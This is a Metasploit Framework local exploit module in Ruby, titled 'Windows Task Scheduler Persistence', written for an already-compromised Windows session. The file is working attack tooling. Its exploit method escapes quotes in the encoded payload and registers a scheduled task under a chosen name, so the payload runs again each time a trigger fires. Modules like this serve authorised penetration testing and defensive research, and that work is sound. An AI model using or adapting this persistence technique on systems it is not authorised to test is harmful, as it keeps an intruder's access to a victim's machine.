##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  # include Msf::Post::File
  include Msf::Post::Windows::TaskScheduler

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Task Scheduler Persistence',
        'Description' => %q{
          This module will create a scheduled task that will be run a given payload
          every time a given trigger is hit. This may function similar to cron in linux.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Nick Cottrell <Rad10Logic>',
        ],
        'Platform' => [ 'windows' ],
        'Arch' => ARCH_CMD,
        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],
        'DefaultOptions' => { 'DisablePayloadHandler' => true },
        'Targets' => [
          ['Automatic', {} ],
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-05-17',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TASK_NAME', [true, 'the Name given to the new task'])
    ])
  end

  def exploit
    # deal with quote misappropriation
    escaped_payload = payload.encoded.gsub(/"/) { |match| '\\' + match }
    vprint_status("Payload: #{escaped_payload}")
    task_create(datastore['TASK_NAME'], escaped_payload)
  end
end
